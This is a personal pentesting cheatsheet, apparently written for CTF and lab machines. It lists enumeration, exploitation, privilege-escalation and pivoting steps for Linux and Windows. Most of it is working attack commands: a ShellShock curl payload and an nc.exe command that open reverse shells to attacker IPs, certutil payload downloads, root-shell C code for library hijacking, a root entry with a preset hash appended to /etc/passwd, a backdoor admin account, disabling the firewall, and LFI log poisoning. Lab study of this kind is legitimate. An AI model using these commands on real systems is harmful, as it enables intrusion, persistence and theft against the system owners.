# My Notes / Cheatsheet
### Last Updated: 01 Jul 2021
Notes related to Vuln Assmnt/PenTesting 

#### Approach for Compromising a box
> 1. Identify open ports (**nmap/autorecon/rustscan**), enumerate ports (TCP+UDP) for services.
> 1. Maybe reset the box / IP if nothing found? 
> 1. Run **gobuster/wfuzz** and identify DIR and FILES present. Try using 02 diff wordlists. BurpSuite also has crawler. 
> 1. To enumerate the version of web app, can try http://website:port/readme.md or http://website:port/CHANGELOG http://website:port/README etc ? 
> 1. Run **nikto**, Have you read the source code ? If its a website look whats running ?
> 1. Try NC or CURL the service and see the output ? Anything unsual or weird in header?
> 1. Authentication can be bypassed by **SQLi Auth Bypass** or maybe try **Password Spray** or **BruteForce**.
> 1. Maybe running **CEWL** for a good wordlist generation ?. 
> 1. Wordpress, Joomla, October, Phpmyadmin, Mantis, Adminer etc.
> 1. Running tools e.g **wpscan** or **joomscan** can help further enumeration.
> 1. Try running **Hydra** with HTTP module for brute forcing.
> 1. Cewl can be used to generate a custom wordlist if "/usr/share/wordlists/rockyou.txt" fails. 
> 1. Custom built web normally has:
> 1. SQL injection - **Authentication bypass** & **Database dump** & **Upload malicious file**.
> 1. XSS - Alerting messages and getting cookies
> 1. LFI - **.php?file=/etc/passwd** - Try fuzzing it with WFUZZ. Reading **LOG** files to acheive RCE or Reading **SSH** key files.
> 1. PHP assert ftn to bypass - e.g. http://192.168.10.30/index.php?page=' and die(system("ls")) or '	
> 1. Command Injection - Try Special characters e.g. " ; , | , & , && " etc. ${IFS} is space --- Can help in achieving ComInj. 

#### PrivESC Methodology for Linux
> 1. Creds file or any misconfiguration file? (**find or grep** command)
> 1. SUDO commands this user can run ? (try running sudo -l) 
> 1. SUID binaries present (use **find** command or **suid3num python** script)
> 1. Is there SQL database, try enumerating it ? Maybe it has linux user password in it ? 
> 1. Running ports / services on this box ? (use **netstat** or **ss** command)
> 1. Pspy ?
> 1. Kernel or other exploits e.g. exploits for SUDO ?
> 1. **Linpeas** or **LinEnum** or **Linux Exploit Suggester**
> 1. **LD PreLoad Stuff - Use 'ldd' command to see the dependent .so files** --> https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/


#### PrivESC Methodology for Linux - Dynamic Library Hijacking (if a binary has .so missing)
> 1. Identify a binary (probably SUIDis set) and group/owner is root:root
> 1. ldd /usr/bin/custombinary (to see the dependent .so files). Lets assume our file is **libfowzmalbec.so**
> 1. First identify the location to place the .so file (writeable directory), for this read the **.conf** files inside the **/etc/ld.so.conf.d/**
> 1. is **ldconfig** is loading itself via **cronjob** or allowed to configured **manually** 
> 1. use **strings** against the binary to check the name of **custom function**, lets assume it shows us **fowzmalbec**
> 1. gcc rootshell.c -o vulnlib.so -shared -Wall -fPIC -w
> 1. gcc rootshell.c -o custom_function_name.so -shared -Wall -fPIC -w
> 1. place the .so file in a writeable directory from .conf file of ld.so.conf.d/
> 1. if you get some error like [gcc: error trying to exec 'cc1': execvp: No such file or directory], trying setting the $PATH variable 
> 1. try running that binary, should get **root** shell
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}

or

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void fowzmalbec() 
{
setuid(0); setgid(0); system("/bin/bash");
}
```
#### PrivESC Methodology for Linux - writeable PATH
> 1. Usually normal $PATH is -> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
> 1. If any of the above is writeable, add your custom script.
> 1. Check for a cronjob e.g **run-parts** on Ubuntu is present in **/bin** and if **/usr/local/bin** is writeable, we can make our own malicious **REV shell** or **BASH SUID** script in **/usr/local/bin** as **run-parts** and this will do the work. 

#### PrivESC Methodology for Linux - setting SUID bit on /bin/bash
> 1. Make a bash script file with following contents and make file executable. 
```bash
#!/bin/sh

chmod +s /bin/bash
```
> 1. check the **SUID** bit set on **/bin/bash**.
> 1. /bin/bash -p (you shoud be **root**).

#### PrivESC Methodology for Linux - /etc/passwd && /etc/shadow
> 1. Check who owns -> ls -lart /etc/passwd && who owns ls -lart /etc/shadow. 
> 1. Making user **fm** the root by typing command ->  echo fm::0:0:root:/root:/bin/bash >> /etc/passwd
> 1. openssl for generating password hashes command -> openssl passwd -1
> 1. username:password === skinny1:123 ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```

#### Pivoting crap - MSF, socks4a and proxychains
> 1. use msf exploit/multi/handler
> 1. get session as reverse shell
> 1. upgrade the session to meterpreter by running command --> sessions -u 1
> 1. go to upgraded meterpreter session and type the autoroute command ---> run autoroute -s <the network you want to access>
> 1. to see if the new network is accessible, run **ping sweep* by typing command --->  use -> multi/gather/ping_sweep. use new network and meterpreter session number.
> 1. to set up socks4a server ---> use auxiliary/server/socks4a
> 1. edit proxychains.conf, add sock4a proxy with 127.0.0.1 and port 1080.
> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like sudo proxychains nmap --sT sC -sV -r -v -Pn <IP> 
  
#### cgi-bin folder or ShellShock
> e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
> curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.100/9999 0>&1' http://192.168.10.10/cgi-bin underworld/test.sh

#### Portforwarding via BurpSuite
> 1.  Under "Proxy Listeners" add new listener on random port [e.g TCP9000] and select option "All Interfaces". In "Request Handling" tab give the IP and Port [e.g IP2:80] of server you want to access. Now if you open http://IP1:9000 it will redirect to http://IP2:80

#### FTP download a directory 
> 1. ftp://192.168.75.65/Logs
> 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//absolute/path/to/directory
> 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//Logs
> 1. ncftp -u [user] -p [pass] [server]

#### Exploiting Redis service --- Usually running on 6379
> 1. "Redis Load Module" technique, for this you need to upload a file to SERVER, so something like FTP or SSH with WRITE access
> 1. Download this repo -> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
> 1. Run "make" command and put the "module.so" file to server
> 1. Next connect to Redis server via telent; command - telnet 192.168.XXX.XXX 6379
> 1. and load this moudle; command - MODULE LOAD /path/of/module.so
> 1. if everything goes well, you should see "+OK"
> 1. in redis run command: system.exec "id" and you should see "id" command output

#### Portforwarding local service 8080
> using **socat** for local port forwarding. In this example port 8080 is running locally and we will forward and make it public to 8089.\
> socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080

#### wpscan commands
> 1.  wpscan -e ap --rua --disable-tls-checks --detection-mode aggressive --plugins-detection aggressive --url https://xxx.xxx

#### Portforwarding local service 5901 (VNC) - HackMyVM Box Level
> 1. using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
> 1. there is a service running on port 5901 locally.\
> 1. ss -tupln output --> 127.0.0.1:5901 (locally) && 0.0.0.0:65000 (global) && :80(global).\
> 1. From Kali Box run: ssh -L 5901:localhost:5901 one@192.168.10.11 -p 65000.\
> 1. Now you can acess that port 5901 locally i.e. (from Kali Box: http://127.0.0.1:5901) .\
> 1. **VNC open session** vncviewer -passwd remote_level 127.0.0.1:5901

#### Fuzzing LFI
> 1. wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
6_64; rv:78.0) Gecko/20100101 Firefox/78.0"
> 1. wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
6_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP

#### Making Shell Interactive - Linux 
> 1. **In reverse shell** 
> 1. python -c 'import pty; pty.spawn("/bin/bash")'
> 1. python3 -c 'import pty; pty.spawn("/bin/bash")'
> 1. Ctrl-Z

> 1.  **In Attacker console**
> 1. stty raw -echo
> 1. fg

> 1. **In reverse shell**
> 1. reset
> 1. export SHELL=bash
> 1. export TERM=xterm-256color
> 1. stty rows <num> columns <cols>; e.g stty rows 29 columns 103

> 1. **In Attacker console**
> 1. stty size (to find ROWS and COLUMNS value)

#### Setting up PHP server
> 1. To execute a PHP script file, in command line simply type -> php <file name.php>
> 1. to start a php based webserver, simply type -> php -S localhost:8000
  
#### Windws Tricks
##### Download a file in Windows via certutil
> 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe

##### Download a file in Windows via FTP client 
> 1. on Kali box first install module of ftp by running: pip install pyftpdlib
> 1. start FTP server: python -m pyftpdlib -p 21
> 1. on Windows box type command: echo open 10.10.16.185 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe 
> 1.  ftp.txt&echo bye>> ftp.txt
> 1. The above command will create a ftp.txt file which will have commands to download the file.
> 1. Finally run: ftp -v -n -s:ftp.txt
> 1. and file will be downloaded. 

##### RCE via PHP system on Windows server - LFI - Log Poision
> 1. Use "seclist ---> LFI ---> Windows file" for fuzzing/testing LFI
> 1. A good location can be ---> c:\windows\system32\drivers\etc\hosts
> 1. To test whether you have you can do RCE, try adding this to UserAgent field--- <?php system('dir');?>
> 1. Try loading the log file and you should see files listed. 

##### Shell on Windows via nc.exe
> 1. Dowload nc.exe --- certutil.exe -urlcache -split -f http://192.168.49.202:445/nc.exe
> 1. Get reverse shell --- nc.exe 192.168.49.202 4443 -e cmd


##### PrivESC Methodology for Windows
> 1. Run commands such as -> whoami --- whoami /priv [to see the privileges]
> 1. Exploits can be: Kernel, Service
> 1. Run winpeas with fast, searchfast or cmd options.
> 1. Run multiple scripts e.g windows-exploit-suggester or sharup or juciy potato etc. 
> 1. Look for exploits on -> https://github.com/SecWiki/windows-kernel-exploits
> 1. find OS details - systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
> 1. total users present - net users
> 1. specific user details - net user <username>
> 1. FW status - netsh firewall show state

##### Windows add an Admin user from CMD
> 1. net user /add [username] [password] ---> net user /add superadmin Superadmin123$
> 1. net localgroup administrators [username] /add ---> net localgroup administrators superadmin


##### Windows Firewall from CMD
> 1. FW on --- netsh advfirewall set currentprofile state on
> 1. FW off --- netsh advfirewall set currentprofile state off

##### Windows RDP from CMD
> 1. enable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
> 1. disable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f


##### Access Windows box via xfreerdp
> 1. xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389

  
##### Ubuntu WSL2 on Windows 10 - SSH portforwarding to access it via Public IP
> 1. changed following in the sudo /etc/ssh/sshd_config
  ```bash
  Port 2222
  AddressFamily any
  ListenAddress 0.0.0.0
  ```
> 1. restart ssh service
> 1. netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=2222 connectaddress=<Windows or WSL IP here> connectport=2222 [ portfwd]
> 1. netsh advfirewall firewall add rule name=”Open Port 2222 for WSL2” dir=in action=allow protocol=TCP localport=2222 [ firewall]
> 1. netsh interface portproxy show v4tov4 [ to show the entries added]
> 1. netsh int portproxy reset all [ reset everything ]

#### Scripts & Utilities
> 1. Extract IP addresses out a file - sed '/\n/!s/[0-9.]\+/\n&\n/;/^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\n/P;D' {file name}

#### Hashcat Generate Custom Wordlist
> 1. hashcat --force words -r /usr/share/hashcat/rules/append_specialchars.rule -r /usr/share/hashcat/rules/best64.rule --stdout > hashcardDict.txt
> 1. /usr/share/hashcat/rules/append_specialchars.rule ---> has special characters specified e.g. ! @ # *

#### Linux tips
> 1. convert next line to white space `cat file.txt | tr '\r\n' ' '`
> 1. delete white spaces from a file `cat file.txt | tr -d ' '`
> 1. print only 1st field before ":" `cut -d ":" -f1  myfile.txt.2 > usernames`
  
#### Cracking passwords from .pcap file
> 1. ```aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```

#### Joomla Reverse Shell
> 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
> 1. https://vk9-sec.com/reverse-shell-on-any-cms/
